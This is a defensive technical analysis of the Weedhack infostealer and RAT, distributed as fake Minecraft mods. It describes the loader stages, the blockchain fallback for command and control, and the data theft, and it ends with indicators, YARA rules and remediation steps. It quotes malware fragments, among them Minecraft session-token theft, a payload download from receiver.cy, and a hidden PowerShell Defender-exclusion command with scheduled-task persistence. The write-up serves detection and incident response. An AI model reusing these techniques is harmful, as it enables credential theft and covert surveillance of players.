# WEEDHACK STEALER - TECHNICAL ANALYSIS

```
 __      __              .____.__                   __
/  \    /  \ ____   ____ |    |  |__ _____    ____ |  | __
\   \/\/   _/ __ \_/ __ \| |\ |  |  \\__  \ _/ ___\|  |/ /
 \        /\  ___/\  ___/| |/ |   Y  \/ __ \\  \___|    <
  \__/\  /  \___  >\___  |____|___|  (____  /\___  |__|_ \
       \/       \/     \/         \/     \/     \/     \/
                    S T E A L E R
```

## SUMMARY

Multi-stage infostealer targeting Minecraft players. Distributed as fake Fabric mods.
Two variants observed - v1 was pure Java and easy to take down, v2 added native
obfuscation and blockchain-based C2 fallback.

Base functionality steals browser creds, Discord tokens, crypto wallets, MC accounts.
Premium tier ($5) adds full RAT: keylogger, webcam, screen share, remote shell.

Sold as MaaS with buyer UUID tracking through weedhack.cy panel.


================================================================================

                         VERSION 1 - ORIGINAL VARIANT
                              (mod.jar / ~500KB)
                              
================================================================================

First observed late 2025. Pure Java implementation with no native code in Stage1.
All logic visible through standard decompilation.

STAGE1 v1 FILE STRUCTURE:
```
mod.jar (v1)/
├── fabric.mod.json           ← mod metadata, ID: "loaderclient"
├── me/mclauncher/
│   ├── LoaderClient.java     ← Fabric entrypoint, onInitialize()
│   ├── StagingHelper.java    ← Stage2 download + classloader logic
│   └── IMCL.java             ← Custom in-memory classloader
└── cfg.json                  ← buyer UUID embedded in JAR
```

STAGE1 v1 EXECUTION:
```
    1. Fabric calls LoaderClient.onInitialize()

    2. Immediate session theft:
       MinecraftClient mc = MinecraftClient.getInstance();
       Session session = mc.getSession();
       String token = session.getAccessToken();    ← account compromised
       String username = session.getUsername();
       String uuid = session.getUuid();

    3. Background thread spawned for Stage2:
       new Thread(() -> {
           StagingHelper.stageWithContext(contextJson);
       }).start();

    4. StagingHelper downloads module.jar:
       URL: https://receiver.cy/files/jar/module
       No authentication, no signature verification

    5. JAR parsed in memory (AV evasion):
       ZipInputStream over downloaded bytes
       Classes extracted to HashMap<String, byte[]>

    6. IMCL classloader loads Stage2:
       Class<?> main = imcl.loadClass("dev.majanito.Main");
       Method init = main.getMethod("initializeWeedhack", JsonObject.class);
       init.invoke(null, context);
```

STAGE1 v1 STRING ENCRYPTION:
```
    decS(int[] d1, int[] d2, int k1, int k2)

    Algorithm visible in Java bytecode:
    1. Interleave arrays: [A,B,C] + [X,Y,Z] → [A,X,B,Y,C,Z]
    2. Build substitution table: config[i] = (i * 47 + 131) % 256
    3. For each byte:
       - XOR with previous (or k1 if first)
       - Bit rotate by (index * 3 + k2) % 8
       - Inverse table lookup
       - XOR with offset and k2

    Static keys in every sample: k1=187, k2=67
    Trivially reversible once you know the algorithm.
```

v1 WEAKNESSES:
```
    [CRITICAL] Single hardcoded C2 domain
              receiver.cy - no DGA, no fallback
              Domain takedown = campaign dead

    [CRITICAL] Unauthenticated payload download
              Anyone can GET /files/jar/module
              MITM can inject arbitrary code

    [HIGH] All logic in Java bytecode
           Decompile with CFR/Procyon → full source
           String decryption algo completely visible

    [HIGH] No anti-analysis
           No VM detection
           No debugger checks
           No sandbox evasion
           Runs anywhere without complaint

    [MEDIUM] Debug strings left in
             "Mod init state: M0" - client null
             "Mod init state: M1" - session null
             "Resource state: S0" - cfg.json fail
             "Resource state: S1" - download fail
             Free debugging for analysts

    [LOW] Identifiable branding
          "Weedhack" in class names
          Consistent package structure
          Easy to write signatures
```


================================================================================
                          VERSION 2 - HARDENED VARIANT
                              (NewMod.jar / ~1.5MB)
================================================================================

Observed early 2026. Significant upgrade in protection. Critical logic moved to
native code via JNIC obfuscation. Added blockchain-based C2 fallback.

STAGE1 v2 FILE STRUCTURE:
```
NewMod.jar (v2)/
├── fabric.mod.json
├── me/mclauncher/
│   ├── LoaderClient.java     ← entry, now calls NATIVE decS
│   ├── StagingHelper.java    ← ALL METHODS NOW NATIVE
│   ├── IMCL.java             ← same classloader
│   ├── RPCHelper.java        ← NEW: blockchain C2 fallback
│   └── MEntrypoint.java      ← NEW: standalone execution
├── dev/jnic/lXpXvp/          ← JNIC obfuscation layer
│   ├── JNICLoader.java       ← DLL extraction + System.load()
│   └── [single letter].java  ← LZMA decompressor classes
├── cfg.json
└── /dev/jnic/lib/c4f763d6-e34c-42e9-bba1-b80cfa5a55df.dat
    └── LZMA-compressed native DLL (~1.2MB each arch)
```

WHAT CHANGED v1 → v2:
```
    ┌──────────────────────────┬─────────────────────┬──────────────────────┐
    │       FEATURE            │    v1 (Original)    │    v2 (NewMod)       │
    ├──────────────────────────┼─────────────────────┼──────────────────────┤
    │ String decryption        │ Java (reversible)   │ Native DLL           │
    │ Download function        │ Java HttpClient     │ Native DLL           │
    │ stageWithContext()       │ Java (~50 lines)    │ Native stub          │
    │ C2 mechanism             │ HTTP only           │ HTTP + Blockchain    │
    │ Fallback C2              │ None                │ Ethereum RPC         │
    │ Native code              │ None                │ JNIC (lXpXvp)        │
    │ DLL resource             │ N/A                 │ c4f763d6-e34c-...    │
    │ Anti-takedown            │ None                │ RSA-signed updates   │
    └──────────────────────────┴─────────────────────┴──────────────────────┘
```

STAGINGHELPER.java - BEFORE/AFTER:
```
    v1 (VISIBLE):                         v2 (NATIVE STUBS):
    ─────────────                         ────────────────────
    public static void                    public static native void
      stageWithContext(JsonObject ctx)      stageWithContext(JsonObject);
    {
      String url = decS(...);             public static native String
      byte[] jar = download(url);           decS(int[], int[], int, int);
      // 50+ lines of visible code
      // C2 URL in plain sight            private static native byte[]
      // classloader logic exposed          dl(String url);
    }
                                          // all real logic in DLL now
    public static String
      decS(int[] d1, int[] d2, ...)
    {
      // algorithm fully visible
    }
```

RPCHELPER.java - BLOCKCHAIN C2 (NEW IN v2):
```
    Ethereum-based fallback when HTTP C2 is down.

    public class RPCHelper {
        private static final String[] RPC_URLS;           // ETH node endpoints
        private static final String GET_TEXT_SELECTOR = "0xce6d41de";
        private static final String RSA_PUBLIC_KEY = "MIIBIjAN...";

        public native String getVerifiedText(String contractAddr);
        private native String callGetText(String rpcUrl, String addr);
        private native String decodeAbiString(String hexData);
        private native boolean verifyRsaSignature(String data, String sig);
    }

    Flow:
    ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
    │ eth_call to  │────►│ Smart        │────►│ ABI decode   │
    │ public node  │     │ Contract     │     │ response     │
    │              │     │ getText()    │     │              │
    └──────────────┘     └──────────────┘     └──────────────┘
                                                    │
                                                    ▼
    ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
    │ Use new C2   │◄────│ RSA verify   │◄────│ Parse signed │
    │ address      │     │ signature    │     │ payload      │
    └──────────────┘     └──────────────┘     └──────────────┘

    Function selector 0xce6d41de = keccak256("getText()")[:4]

    Why this matters:
    - Domain takedown no longer kills the campaign
    - Attacker updates C2 via blockchain transaction
    - RSA signature prevents hijacking
    - Smart contract = censorship-resistant dead drop
    - Could be on any EVM chain (ETH, BSC, Polygon, etc)
```

RSA-2048 PUBLIC KEY (embedded in v2):
```
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtmNzDf4737/iYWvscWg6
    vQg9dHa/yUchfQY9r5htNTLZ3ZDAbqrzN93I0ctZHa27oRnkpB7XpowI4NH8eIRm
    aMThggpTYRXzHzLvUjhyrFFPkIOo/HI1gZF5IV7/XmvYWqgEsSpxl0iesOUlaWO5
    A8QlTu0QLsZAzZtzZyLj/v1XbPT02rTvZkuRhE6nzpUR4GN3Jp4Bn8zQAWdFDe17
    PWZxOi19uUTMPzgFj9n3h7DprwBmE3fR7IMsbiFacAoSHfqkTpEwY7A8ArK1DQ1y
    JXPog/PQ4aTU9gU38WC20wtct796ImZiuRYdNWcSzHda5ZbvZdvpw6RHh0zQqGVh
    RQIDAQAB

    Used to verify blockchain-retrieved C2 configs.
    Only holder of private key can push updates.
```

MENTRYPOINT.java - STANDALONE MODE (NEW IN v2):
```
    public class MEntrypoint {
        public static native void main(String[] args);
        public static native void checkJVMLauncher(String[] args);
    }

    Allows running outside Minecraft/Fabric context.
    SecurityManager.jar uses this to bootstrap the malware.
```

v2 DLL DETAILS:
```
    Resource: /dev/jnic/lib/c4f763d6-e34c-42e9-bba1-b80cfa5a55df.dat
    Package: dev.jnic.lXpXvp
    Contains:
      - StagingHelper native implementations
      - RPCHelper native implementations
      - decS string decryption
      - dl() download function
      - Ethereum ABI encoding/decoding
      - RSA signature verification
```

v2 REMAINING WEAKNESSES:
```
    [MEDIUM] Same string encryption keys
             k1=187, k2=67 still hardcoded
             Just need to reverse the DLL once

    [MEDIUM] Temp file for DLL extraction
             File.createTempFile("lib", null)
             Detectable pattern

    [LOW] Still uses receiver.cy as primary
          Blockchain is fallback only
          HTTP C2 checked first

    [LOW] Same package naming
          me.mclauncher.* still present
          dev.jnic.* easy to signature
```


================================================================================

                           STAGE 2 - INFO STEALER
                              (module.jar / ~2MB)
                           [SHARED - BOTH VERSIONS]
                           
================================================================================

Downloaded by Stage1 from receiver.cy/files/jar/module
Loaded via IMCL in-memory classloader. Never touches disk directly.
JNIC protected (dev.jnic.BSOMwJ).

JNIC NATIVE LAYER:
```
    Resource: /dev/jnic/lib/a125e430-2459-4702-9797-49fce5f280ae.dat
    ├── Bytes 0-1274880:        Windows x64 DLL
    └── Bytes 1274880-2529280:  Windows ARM64 DLL

    Extraction:
    1. JNICLoader.init() called on first native method
    2. Reads .dat resource from JAR
    3. LZMA decompresses to temp file
    4. System.load() the DLL
    5. Native methods now available

    Obfuscated decompressor classes:
    dev.jnic.BSOMwJ.c  → circular buffer
    dev.jnic.BSOMwJ.o  → range decoder
    dev.jnic.BSOMwJ.w  → main LZMA loop
    dev.jnic.BSOMwJ.m  → range coder base
```

THEFT CAPABILITIES:
```
    BROWSERS (40+ supported)
    ════════════════════════
    Chrome, Edge, Brave, Opera, OperaGX, Vivaldi, Yandex,
    Chromium, Thorium, 7Star, CentBrowser, Chedot, Kometa,
    + 30 more chromium forks

    Stolen:
    ├── Cookies (session hijacking)
    ├── Saved passwords (DPAPI decryption)
    └── All profiles enumerated

    CRYPTO WALLETS (56 browser extensions)
    ══════════════════════════════════════
    MetaMask, Phantom, Coinbase, Trust Wallet, Exodus Web3,
    Ronin, Keplr, Solflare, + 50 more

    Desktop wallets:
    Exodus, Atomic, Electrum, Zcash, Armory, Bytecoin,
    Jaxx, Ethereum, Guarda, Coinomi

    MINECRAFT LAUNCHERS
    ═══════════════════
    Lunar Client     → accounts.json
    Essential Mod    → microsoft_accounts.json
    Feather Launcher → account.txt (DPAPI+AES-GCM - they crack it)
    Modrinth App     → app.db (SQLite token query)
    Vanilla MC       → servers.dat

    DISCORD
    ═══════
    ├── Encrypted tokens (desktop)
    ├── Legacy unencrypted tokens
    ├── Browser storage tokens
    └── Token validation against API

    OTHER
    ═════
    ├── Telegram tdata folder
    ├── Screenshots (base64)
    ├── System fingerprint
    └── Keyword file search:
        "password", "seed", "wallet", "crypto", "2fa", "backup"...
```

NATIVE METHODS (all stealing logic hidden):
```
    BrowserHandler.getBrowserInfo()        → native
    CookieHandler.getCookies()             → native
    PasswordHandler.getPasswords()         → native
    DiscordHandler.getDiscordTokens()      → native
    DllInjectionHelper.injectDll()         → native
    CryptoHelper.gcmDecrypt()              → native
    // everything sensitive is in the DLL
```


================================================================================

                          STAGE 3 - PREMIUM RAT ($5)
                             (Component.jar)
                           [SHARED - BOTH VERSIONS]
                           
================================================================================

Optional component for buyers who pay extra. Downloaded by SecurityManager.jar
from receiver.cy/files/jar/component. JNIC protected (dev.jnic.fwcMeR).

RAT HANDLERS:
```
    [1] KEYLOGGER - KeyLoggingHandler.java
    ══════════════════════════════════════
    Tech: jnativehook library
    Transport: Socket.IO real-time

    public class KeyLoggingHandler implements NativeKeyListener {
        public static native void startLogging(Socket socket);
        public static native void stopListening();
        // streams every keystroke to attacker panel
    }

    [2] WEBCAM - WebcamShareHandler.java
    ════════════════════════════════════
    Tech: @ClientEndpoint WebSocket
    Rate: 25 FPS continuous

    @ClientEndpoint
    public class WebcamShareHandler {
        private static final int FPS = 25;
        public synchronized native void start();
        public synchronized native void stop();
        // yes, they watch minecraft kids through webcams
    }

    [3] SCREEN SHARE - ScreenShareHandler.java
    ══════════════════════════════════════════
    Tech: WebSocket + Robot class
    Format: WebP @ 0.85 quality, max 720p
    Rate: 25 FPS

    private static final int FPS = 25;
    private static final int MAX_TARGET_HEIGHT = 720;
    private static final float WEBP_QUALITY = 0.85f;

    [4] REMOTE SHELL - CmdHandler.java
    ═══════════════════════════════════
    Runtime.exec() / ProcessBuilder
    Returns stdout/stderr to attacker
    Full command execution

    [5] FILE BROWSER - FileSystemHandler.java
    ═════════════════════════════════════════
    List directories
    Download files from victim
    Upload files to victim (additional payloads?)

    [6] INPUT SIMULATION - KeyboardInputHandler + MouseInputHandler
    ═══════════════════════════════════════════════════════════════
    java.awt.Robot for injection
    Combined with screen share = full remote desktop
```


================================================================================

                          PERSISTENCE MODULE
                          (SecurityManager.jar)
                         [SHARED - BOTH VERSIONS]
                         
================================================================================

Orchestrates persistence, AV evasion, and component updates.
Only deployed for premium tier buyers.

INSTALLATION LOCATION:
```
    %APPDATA%\Microsoft\SecurityUpdates\
    ├── SecurityInfo.json     ← config with buyer UUID
    ├── Updater.vbs           ← hidden window launcher
    ├── component-<uuid>.jar  ← downloaded RAT
    └── security.lock         ← single instance mutex
```

[1] UAC "BYPASS" - ElevationHelper.java
```
    public static void elevate() {
        WinDef.INT_PTR res = Shell32.INSTANCE.ShellExecute(
            hwnd, "runas", javaExe, params, null, 1
        );
        if (status == 5L) {
            ElevationHelper.elevate();  // denied? try again lol
        }
        System.exit(0);
    }

    Not a real bypass - just nags until user clicks Yes.
    Social engineering: victim thinks it's a legit update.
```

[2] DEFENDER EXCLUSION - AVHelper.java
```
    public static void addExclusions() {
        Process p = Runtime.getRuntime().exec(
            "powershell.exe -WindowStyle Hidden -Command " +
            "Add-MpPreference -ExclusionPath 'C:\\Users'"
        );
    }

    Adds ENTIRE C:\Users to exclusions.
    Downloads, Documents, everything = unscanned.

    Detection: Event ID 5007 in Windows Defender logs
    Check: Get-MpPreference | select ExclusionPath
```

[3] SCHEDULED TASK - SchedulerHelper.java
```
    Updater.vbs:
    ────────────
    Set sh = CreateObject("WScript.Shell")
    cmd = """" & javaExe & """ -cp """ & jarPath & """ dev.majanito.security.Main"
    sh.Run cmd, 0, False   ← 0 = hidden window

    Task creation:
    ──────────────
    schtasks /Create /TN "JavaSecurityUpdater"
             /SC ONLOGON
             /TR "path\Updater.vbs"
             /RL HIGHEST
             /IT /F
```

[4] COMPONENT UPDATER - ComponentHelper.java
```
    while (true) {
        Thread.sleep(10000);  // poll every 10 sec
        long newTs = checkLastModified();
        if (newTs != oldTs) {
            byte[] jar = downloadJar();
            startOrReload(jar);  // hot-reload new version
        }
    }

    URLs:
    - https://receiver.cy/files/jar/component
    - https://receiver.cy/api/component/lastModified

    Attacker can push updates to all infected machines.
```


================================================================================

                            NETWORK INDICATORS
                            
================================================================================

```
DOMAINS
═══════
receiver.cy          ← primary C2
weedhack.cy          ← seller panel

URLS
════
https://receiver.cy/files/jar/module          ← Stage2 download
https://receiver.cy/files/jar/component       ← Stage3 RAT download
https://receiver.cy/api/component/lastModified

REAL-TIME
═════════
Socket.IO connections     ← keylogger data
WebSocket streams         ← webcam/screen share

BLOCKCHAIN (v2 only)
════════════════════
Ethereum JSON-RPC eth_call
Function selector: 0xce6d41de
RSA signature verification of response
```


================================================================================

                             FILE INDICATORS
                             
================================================================================

```
PACKAGES
════════
me.mclauncher.*
dev.majanito.*
dev.majanito.handlers.*
dev.majanito.security.*
dev.majanito.security.utils.*
dev.jnic.BSOMwJ.*          ← Stage2 JNIC
dev.jnic.fwcMeR.*          ← Stage3 JNIC
dev.jnic.lXpXvp.*          ← Stage1 v2 JNIC

FILE PATHS
══════════
%APPDATA%\Microsoft\SecurityUpdates\
%APPDATA%\Microsoft\SecurityUpdates\SecurityInfo.json
%APPDATA%\Microsoft\SecurityUpdates\Updater.vbs
%APPDATA%\Microsoft\SecurityUpdates\component-*.jar
%APPDATA%\Microsoft\SecurityUpdates\security.lock
%TEMP%\lib*.tmp                                        ← DLL extraction

EMBEDDED RESOURCES
══════════════════
cfg.json
/dev/jnic/lib/a125e430-2459-4702-9797-49fce5f280ae.dat    ← Stage2 DLL
/dev/jnic/lib/c4f763d6-e34c-42e9-bba1-b80cfa5a55df.dat    ← Stage1 v2 DLL

STRINGS
═══════
"Mod init state: M"
"Resource state: S"
"initializeWeedhack"
"WeedhackFile"
"$jnicLoader"
"JavaSecurityUpdater"
"Add-MpPreference -ExclusionPath"
"dev.majanito.security.Main"
"0xce6d41de"                                              ← v2 only
"getVerifiedText"                                         ← v2 only

REGISTRY
════════
HKCU\Software\Microsoft\Windows\CurrentVersion\Run

SCHEDULED TASKS
═══════════════
Name: JavaSecurityUpdater
Trigger: ONLOGON
Run Level: HIGHEST
```


================================================================================

                              YARA SIGNATURES
                              
================================================================================

```yara
rule Weedhack_Stage1_v1:
    meta:
        description = "Weedhack Stage1 v1 - Pure Java loader"
        date = "2026-01"
    strings:
        $pkg = "me/mclauncher/"
        $stg = "StagingHelper"
        $dbg = "Mod init state:"
        $imcl = "IMCL"
    condition:
        uint32(0) == 0x04034b50 and 3 of them
        and not "dev/jnic/lXpXvp"

rule Weedhack_Stage1_v2:
    meta:
        description = "Weedhack Stage1 v2 - JNIC + Blockchain C2"
        date = "2026-01"
    strings:
        $pkg = "me/mclauncher/"
        $jnic = "dev/jnic/lXpXvp"
        $rpc = "RPCHelper"
        $entry = "MEntrypoint"
        $uuid = "c4f763d6-e34c-42e9-bba1-b80cfa5a55df"
        $selector = "0xce6d41de"
    condition:
        uint32(0) == 0x04034b50 and $jnic and 2 of them

rule Weedhack_Stage2_Stealer:
    meta:
        description = "Weedhack Stage2 - Info stealer module"
        date = "2026-01"
    strings:
        $pkg = "dev/majanito/"
        $jnic = "dev/jnic/BSOMwJ"
        $entry = "initializeWeedhack"
        $uuid = "a125e430-2459-4702-9797-49fce5f280ae"
    condition:
        uint32(0) == 0x04034b50 and 2 of them

rule Weedhack_Stage3_RAT:
    meta:
        description = "Weedhack Stage3 - Premium RAT component"
        date = "2026-01"
    strings:
        $pkg = "dev/majanito/handlers"
        $jnic = "dev/jnic/fwcMeR"
        $key = "KeyLoggingHandler"
        $cam = "WebcamShareHandler"
        $scr = "ScreenShareHandler"
    condition:
        uint32(0) == 0x04034b50 and ($pkg or $jnic) and 1 of ($key,$cam,$scr)

rule Weedhack_Persistence:
    meta:
        description = "Weedhack persistence module"
        date = "2026-01"
    strings:
        $pkg = "dev/majanito/security"
        $task = "JavaSecurityUpdater"
        $path = "Microsoft\\SecurityUpdates"
        $av = "AVHelper"
        $elev = "ElevationHelper"
    condition:
        uint32(0) == 0x04034b50 and 2 of them
```


================================================================================

                               REMEDIATION
                               
================================================================================

```
1. Kill persistence:
   schtasks /Delete /TN "JavaSecurityUpdater" /F

2. Remove files:
   rmdir /s /q "%APPDATA%\Microsoft\SecurityUpdates"

3. Fix Defender exclusion:
   Remove-MpPreference -ExclusionPath 'C:\Users'

4. Check registry:
   reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
   Delete any suspicious Java entries

5. Credential rotation (MANDATORY):
   - Change Minecraft password
   - Revoke Discord token (change password)
   - Clear all saved browser passwords
   - Check crypto wallets for unauthorized transactions
   - Reset 2FA everywhere

6. If RAT was active (premium tier):
   Consider full system reimage. Attacker had shell access,
   webcam/screen surveillance, and could drop additional payloads.
```


================================================================================

                                 NOTES
                                 
================================================================================

```
The evolution from v1 to v2 shows the author learned from their mistakes.
v1 was amateur hour - single domain, no fallback, all logic in Java.
v2 is actually somewhat competent - JNIC obfuscation, blockchain C2 fallback.

That said, they still left the same encryption keys, same package names,
and the "SecurityUpdates" folder is a joke that any IR analyst will spot.

The blockchain C2 is concerning though. Can't just file a takedown request
with Cyprus NIC anymore. Need to track the smart contract, monitor for
updates, potentially coordinate with blockchain forensics.

Primary targets are Minecraft players, likely kids. The webcam/keylogger
capabilities in the premium tier are particularly disturbing.

Sold as MaaS - multiple buyers distributing modified JARs. Each has a UUID
for victim tracking. Panel at weedhack.cy shows buyer their specific victims.
```
